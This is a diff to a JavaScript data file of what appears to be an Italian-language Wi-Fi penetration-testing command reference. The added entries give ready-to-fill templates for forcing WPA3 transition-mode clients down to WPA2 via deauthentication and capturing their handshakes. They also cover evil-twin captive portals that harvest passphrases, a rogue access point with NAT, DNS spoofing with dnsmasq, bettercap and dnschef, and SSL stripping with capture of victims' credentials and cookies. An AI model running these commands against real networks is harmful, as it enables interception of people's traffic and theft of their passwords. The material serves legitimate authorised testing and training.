@@ -2688,6 +2688,57 @@ const WIFI_COMMANDS = [
     ]
   },
   {
+    "id": "wifi-wpa3-transition",
+    "name": "WPA3 transition mode — downgrade a WPA2",
+    "category": "wifi-psk",
+    "subcategory": "handshake",
+    "group": "Cattura",
+    "description": "WPA3-Personal in transition mode resta retrocompatibile con WPA2 sullo stesso SSID. Un client che supporta WPA2 può agganciarsi al fallback: lo si deautentica e si cattura il suo 4-way handshake WPA2, poi crackabile come una normale PSK. È l'unico WPA3 praticamente attaccabile offline: il SAE puro non produce handshake da dizionario.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "wpa3",
+      "wpa2"
+    ],
+    "tags": [
+      "wpa3",
+      "transition",
+      "downgrade",
+      "sae",
+      "handshake"
+    ],
+    "template": "# 1) è WPA3 in transition? airodump mostra AUTH con SAE e PSK sullo stesso BSSID\nairodump-ng -c <channel> --bssid <bssid> <mon>\n\n# 2) deautentica un client che parla WPA2 per forzarne il reagganciamento sul fallback\naireplay-ng -0 5 -a <bssid> -c <client> <mon>\n\n# 3) cattura il 4-way handshake WPA2 come di consueto, poi crack PSK\n# (vedi 'airodump-ng — cattura il 4-way handshake' e la sottofase Cracking offline)",
+    "params": [
+      {
+        "key": "channel",
+        "label": "Canale",
+        "ctx": "channel",
+        "placeholder": "6"
+      },
+      {
+        "key": "bssid",
+        "label": "BSSID",
+        "ctx": "bssid",
+        "placeholder": "AA:BB:CC:DD:EE:FF"
+      },
+      {
+        "key": "client",
+        "label": "Client MAC",
+        "ctx": "client",
+        "placeholder": "11:22:33:44:55:66"
+      },
+      {
+        "key": "mon",
+        "label": "Monitor",
+        "ctx": "mon",
+        "placeholder": "wlan0mon"
+      }
+    ],
+    "note": "# Quando funziona\nSolo in transition mode (WPA3-Personal retrocompatibile WPA2): il client negozia WPA2 e produce un handshake attaccabile a dizionario come un PSK qualsiasi. Molti client recenti però preferiscono SAE e non scendono: in quel caso non esce un handshake WPA2 utile.\n# WPA3-SAE puro\nNessun handshake offline: SAE non cade a dizionario. Se la rete è solo SAE, passa all'Evil Twin facendo digitare la passphrase a un utente reale (fase Evil Twin & MiTM)."
+  },
+  {
     "id": "wifi-aireplay-deauth",
     "name": "aireplay-ng -0 — deautenticazione",
     "category": "wifi-psk",
@@ -3311,102 +3362,6 @@ const WIFI_COMMANDS = [
       }
     ],
     "note": "# Confronto con la cattura\nIl valore stampato deve coincidere con quello mostrato da `hcxdumptool` fra parentesi quadre e con il campo PMKID visibile in Wireshark dentro `WPA Key Data` del primo messaggio EAPOL.\n\n# Differenza rispetto al PoC degli appunti\nLo script del modulo CWPE costruisce il messaggio con `str()` applicato ai MAC già esadecimali, il che inserisce nel digest i letterali `b'…'` invece dei byte veri, e non tronca il risultato. Questa versione implementa la formula corretta, quindi produce un valore diverso ma confrontabile con la cattura reale."
-  },
-  {
-    "id": "wifi-eaphammer-psk",
-    "name": "eaphammer — Evil Twin PSK con captive portal",
-    "category": "wifi-psk",
-    "subcategory": "psk-eviltwin",
-    "group": "Evil Twin",
-    "description": "Quando la passphrase resiste al dizionario il bersaglio cambia e diventa l’utente. Si clona la rete, si staccano i client legittimi e chi prova a riconnettersi finisce su un portale che chiede la password del Wi-Fi. La forza dell’approccio sta nel fatto che la risposta viene validata contro l’handshake già catturato, quindi si sa immediatamente se la password inserita è quella vera o un errore di battitura.",
-    "platform": "linux",
-    "requires": [
-      "handshake"
-    ],
-    "protocols": [
-      "wpa2"
-    ],
-    "tags": [
-      "eaphammer",
-      "evil-twin",
-      "captive-portal"
-    ],
-    "template": "sudo eaphammer -i <iface> -e \"<essid>\" -c <channel> --captive-portal",
-    "params": [
-      {
-        "key": "iface",
-        "label": "Interfaccia AP",
-        "ctx": "iface",
-        "placeholder": "wlan1"
-      },
-      {
-        "key": "essid",
-        "label": "ESSID da clonare",
-        "ctx": "essid",
-        "placeholder": "CORP-WIFI"
-      },
-      {
-        "key": "channel",
-        "label": "Canale",
-        "ctx": "channel",
-        "placeholder": "6"
-      }
-    ],
-    "note": "# Prerequisiti\nI certificati vanno generati con `eaphammer --cert-wizard` e serve un handshake della rete vera già catturato, altrimenti non esiste modo di validare la passphrase raccolta.",
-    "refs": [
-      {
-        "label": "eaphammer",
-        "url": "https://github.com/s0lst1c3/eaphammer"
-      }
-    ]
-  },
-  {
-    "id": "wifi-wifiphisher",
-    "name": "wifiphisher — rogue AP con scenari di phishing",
-    "category": "wifi-psk",
-    "subcategory": "psk-eviltwin",
-    "group": "Evil Twin",
-    "description": "Alternativa a eaphammer con una libreria di scenari pronti, dal finto aggiornamento firmware del router alla pagina di login del provider. Richiede una scheda per l’AP fasullo e idealmente una seconda per la deauth continua. Trattandosi di un attacco che intercetta utenti reali, deve essere esplicitamente autorizzato nelle regole di ingaggio.",
-    "platform": "linux",
-    "requires": [
-      "no-creds"
-    ],
-    "protocols": [
-      "wpa2",
-      "http"
-    ],
-    "tags": [
-      "wifiphisher",
-      "evil-twin",
-      "phishing"
-    ],
-    "template": "sudo wifiphisher -aI <iface> -eI <mon> -e \"<essid>\"",
-    "params": [
-      {
-        "key": "iface",
-        "label": "Interfaccia AP",
-        "ctx": "iface",
-        "placeholder": "wlan1"
-      },
-      {
-        "key": "mon",
-        "label": "Interfaccia deauth",
-        "ctx": "mon",
-        "placeholder": "wlan0mon"
-      },
-      {
-        "key": "essid",
-        "label": "ESSID da clonare",
-        "ctx": "essid",
-        "placeholder": "CORP-WIFI"
-      }
-    ],
-    "refs": [
-      {
-        "label": "wifiphisher",
-        "url": "https://github.com/wifiphisher/wifiphisher"
-      }
-    ]
   },
   {
     "id": "wifi-eap-identify",
@@ -4551,6 +4506,251 @@ const WIFI_COMMANDS = [
       }
     ],
     "note": "# Il vettore reale è la rete cablata\nEAP-MD5 non genera chiavi di sessione, quindi il Wi-Fi lo scarta: vive sulle porte switch con 802.1X. Nel laboratorio HTB la cattura è mostrata via Wi-Fi solo per comodità, mentre nella realtà avverrebbe su `eth0` con tcpdump o Wireshark. La logica di cracking resta identica."
+  },
+  {
+    "id": "wifi-eaphammer-psk",
+    "name": "eaphammer — Evil Twin PSK con captive portal",
+    "category": "wifi-eviltwin",
+    "subcategory": "et-rogue",
+    "group": "Captive portal",
+    "description": "Quando la passphrase resiste al dizionario il bersaglio cambia e diventa l’utente. Si clona la rete, si staccano i client legittimi e chi prova a riconnettersi finisce su un portale che chiede la password del Wi-Fi. La forza dell’approccio sta nel fatto che la risposta viene validata contro l’handshake già catturato, quindi si sa immediatamente se la password inserita è quella vera o un errore di battitura.",
+    "platform": "linux",
+    "requires": [
+      "handshake"
+    ],
+    "protocols": [
+      "wpa2"
+    ],
+    "tags": [
+      "eaphammer",
+      "evil-twin",
+      "captive-portal"
+    ],
+    "template": "sudo eaphammer -i <iface> -e \"<essid>\" -c <channel> --captive-portal",
+    "params": [
+      {
+        "key": "iface",
+        "label": "Interfaccia AP",
+        "ctx": "iface",
+        "placeholder": "wlan1"
+      },
+      {
+        "key": "essid",
+        "label": "ESSID da clonare",
+        "ctx": "essid",
+        "placeholder": "CORP-WIFI"
+      },
+      {
+        "key": "channel",
+        "label": "Canale",
+        "ctx": "channel",
+        "placeholder": "6"
+      }
+    ],
+    "note": "# Prerequisiti\nI certificati vanno generati con `eaphammer --cert-wizard` e serve un handshake della rete vera già catturato, altrimenti non esiste modo di validare la passphrase raccolta.",
+    "refs": [
+      {
+        "label": "eaphammer",
+        "url": "https://github.com/s0lst1c3/eaphammer"
+      }
+    ]
+  },
+  {
+    "id": "wifi-wifiphisher",
+    "name": "wifiphisher — rogue AP con scenari di phishing",
+    "category": "wifi-eviltwin",
+    "subcategory": "et-rogue",
+    "group": "Captive portal",
+    "description": "Alternativa a eaphammer con una libreria di scenari pronti, dal finto aggiornamento firmware del router alla pagina di login del provider. Richiede una scheda per l’AP fasullo e idealmente una seconda per la deauth continua. Trattandosi di un attacco che intercetta utenti reali, deve essere esplicitamente autorizzato nelle regole di ingaggio.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "wpa2",
+      "http"
+    ],
+    "tags": [
+      "wifiphisher",
+      "evil-twin",
+      "phishing"
+    ],
+    "template": "sudo wifiphisher -aI <iface> -eI <mon> -e \"<essid>\"",
+    "params": [
+      {
+        "key": "iface",
+        "label": "Interfaccia AP",
+        "ctx": "iface",
+        "placeholder": "wlan1"
+      },
+      {
+        "key": "mon",
+        "label": "Interfaccia deauth",
+        "ctx": "mon",
+        "placeholder": "wlan0mon"
+      },
+      {
+        "key": "essid",
+        "label": "ESSID da clonare",
+        "ctx": "essid",
+        "placeholder": "CORP-WIFI"
+      }
+    ],
+    "refs": [
+      {
+        "label": "wifiphisher",
+        "url": "https://github.com/wifiphisher/wifiphisher"
+      }
+    ]
+  },
+  {
+    "id": "wifi-rogue-nat",
+    "name": "Rogue AP con uscita Internet (NAT)",
+    "category": "wifi-eviltwin",
+    "subcategory": "et-mitm",
+    "group": "Infrastruttura",
+    "description": "Base del man-in-the-middle: una volta che la vittima è associata al rogue AP le si dà uscita verso Internet, così la connessione sembra normale e tutto il suo traffico passa da te. Si abilita l'IP forwarding, si fa il NAT verso l'interfaccia che ha Internet e si serve DHCP+DNS ai client con dnsmasq (gateway e DNS puntano a te).",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [],
+    "tags": [
+      "nat",
+      "dnsmasq",
+      "iptables",
+      "mitm",
+      "rogue-ap"
+    ],
+    "template": "# abilita l'IP forwarding\nsysctl -w net.ipv4.ip_forward=1\n\n# NAT: instrada il traffico del rogue AP verso l'interfaccia con Internet (<upstream>, es. eth0)\niptables -t nat -A POSTROUTING -o <upstream> -j MASQUERADE\n\n# DHCP + DNS per i client del rogue AP su <iface>\n# /etc/dnsmasq.conf minimale:\n#   interface=<iface>\n#   dhcp-range=10.0.0.10,10.0.0.100,12h\n#   dhcp-option=3,10.0.0.1   # gateway = tu\n#   dhcp-option=6,10.0.0.1   # DNS = tu\ndnsmasq -C /etc/dnsmasq.conf -d",
+    "params": [
+      {
+        "key": "iface",
+        "label": "Interfaccia AP",
+        "ctx": "iface",
+        "placeholder": "wlan0"
+      },
+      {
+        "key": "upstream",
+        "label": "Uscita Internet",
+        "placeholder": "eth0"
+      }
+    ],
+    "note": "# Prerequisiti\nIl rogue AP va già tirato su (hostapd in master mode, oppure eaphammer/wifiphisher). Questo comando aggiunge l'inoltro e il NAT che danno Internet alla vittima e ti mettono in mezzo.\n# Prossimo passo\nCon la vittima che naviga attraverso di te, passa a DNS spoofing e intercettazione SSL per dirottare e leggere il traffico."
+  },
+  {
+    "id": "wifi-dns-spoof",
+    "name": "DNS spoofing dal rogue AP",
+    "category": "wifi-eviltwin",
+    "subcategory": "et-mitm",
+    "group": "Intercettazione",
+    "description": "Controllando il DNS dei client del rogue AP si risponde alle loro query con l'IP che vuoi: utile per dirottarli su una pagina di phishing o su un captive portal. Tre vie: la direttiva `address=` di dnsmasq (se usi già dnsmasq come DNS), il modulo `dns.spoof` di bettercap, o dnschef.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "dns"
+    ],
+    "tags": [
+      "dns-spoof",
+      "bettercap",
+      "dnsmasq",
+      "dnschef",
+      "mitm"
+    ],
+    "template": "# con dnsmasq già attivo: aggiungi in /etc/dnsmasq.conf e riavvia\n# ogni query per <domain> (e sottodomini) risponde col tuo IP\naddress=/<domain>/<lhost>",
+    "params": [
+      {
+        "key": "iface",
+        "label": "Interfaccia AP",
+        "ctx": "iface",
+        "placeholder": "wlan0"
+      },
+      {
+        "key": "domain",
+        "label": "Dominio da spoofare",
+        "placeholder": "login.target.com"
+      },
+      {
+        "key": "lhost",
+        "label": "Tuo IP (gateway)",
+        "placeholder": "10.0.0.1"
+      }
+    ],
+    "variants": [
+      {
+        "id": "dnsmasq",
+        "label": "dnsmasq (address=)",
+        "template": "# aggiungi in /etc/dnsmasq.conf e riavvia dnsmasq\n# ogni query per <domain> e sottodomini risponde col tuo IP\naddress=/<domain>/<lhost>",
+        "description": "Se dnsmasq è già il tuo DHCP/DNS: una riga `address=/dominio/IP` dirotta quel dominio. Comodo perché riusa l'infrastruttura del rogue AP."
+      },
+      {
+        "id": "bettercap",
+        "label": "bettercap (dns.spoof)",
+        "template": "bettercap -iface <iface> -eval \"set dns.spoof.domains <domain>; set dns.spoof.address <lhost>; dns.spoof on; net.sniff on\"",
+        "description": "bettercap intercetta e falsifica le risposte DNS al volo. `net.sniff on` mostra anche le query viste."
+      },
+      {
+        "id": "dnschef",
+        "label": "dnschef",
+        "template": "dnschef --fakeip <lhost> --fakedomains <domain> -i <lhost>",
+        "description": "DNS proxy dedicato: risponde `<lhost>` per `<domain>` e inoltra il resto. Punta il DHCP (dnsmasq dhcp-option=6) a questo resolver."
+      }
+    ],
+    "note": "# Prossimo passo\nUna volta dirottato il dominio sul tuo IP, servi una pagina di phishing o un captive portal (eaphammer/wifiphisher) per raccogliere credenziali, oppure combina con l'intercettazione SSL per leggere il traffico reale."
+  },
+  {
+    "id": "wifi-ssl-mitm",
+    "name": "Intercettazione SSL & sniffing",
+    "category": "wifi-eviltwin",
+    "subcategory": "et-mitm",
+    "group": "Intercettazione",
+    "description": "Con la vittima che naviga attraverso il rogue AP si cattura e, dove possibile, si declassa il traffico cifrato. bettercap fa sniffing e stripping HTTPS in un colpo; in alternativa sslstrip con un redirect iptables, e una cattura pcap grezza da spulciare per credenziali e cookie. HSTS limita lo stripping sui siti moderni: spesso rende di più il phishing mirato via DNS spoofing.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "sslstrip",
+      "bettercap",
+      "sniffing",
+      "mitm",
+      "tls"
+    ],
+    "template": "# bettercap: sniff del traffico + tentativo di SSL stripping (sei già il gateway)\nbettercap -iface <iface> -eval \"set net.sniff.verbose true; set http.proxy.sslstrip true; http.proxy on; net.sniff on\"",
+    "params": [
+      {
+        "key": "iface",
+        "label": "Interfaccia AP",
+        "ctx": "iface",
+        "placeholder": "wlan0"
+      }
+    ],
+    "variants": [
+      {
+        "id": "bettercap",
+        "label": "bettercap (strip + sniff)",
+        "template": "# sei già il gateway del rogue AP: niente ARP spoof, basta proxy + sniff\nbettercap -iface <iface> -eval \"set net.sniff.verbose true; set http.proxy.sslstrip true; http.proxy on; net.sniff on\"",
+        "description": "bettercap intercetta HTTP, prova lo stripping di HTTPS e logga credenziali e URL. Lo stripping fallisce sui siti con HSTS."
+      },
+      {
+        "id": "sslstrip",
+        "label": "sslstrip (iptables)",
+        "template": "# redirigi l'HTTP della vittima verso sslstrip\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080\n\n# avvia sslstrip sulla porta 8080\nsslstrip -l 8080 -w sslstrip.log\n\n# leggi le credenziali intercettate\ntail -f sslstrip.log",
+        "description": "Classico sslstrip: declassa i link HTTPS a HTTP e registra le credenziali inviate in chiaro. Oggi efficace solo su siti senza HSTS."
+      },
+      {
+        "id": "sniff",
+        "label": "Cattura & estrai (pcap)",
+        "template": "# cattura grezza del traffico della vittima\ntcpdump -i <iface> -w victim.pcap\n\n# poi estrai credenziali/cookie offline\n# (net-creds, Pcredz, o Wireshark: Follow HTTP Stream)\npython3 Pcredz -f victim.pcap",
+        "description": "Quando non puoi declassare il TLS, cattura comunque tutto: query DNS, HTTP in chiaro, metadati. Estrai credenziali e cookie con Pcredz/net-creds."
+      }
+    ],
+    "note": "# Attenzione\nHSTS e il certificate pinning bloccano lo stripping/intercettazione TLS sui siti seri. Quando il TLS tiene, la via più redditizia è il phishing mirato (DNS spoofing verso una pagina clone) o restare a catturare ciò che viaggia in chiaro.\n# Correlati\nDNS spoofing per dirottare i nomi; `Pcredz` (fase Post-Exploitation del Pentest) per spremere il pcap."
   },
   {
     "id": "wifi-wpasupp-conf",
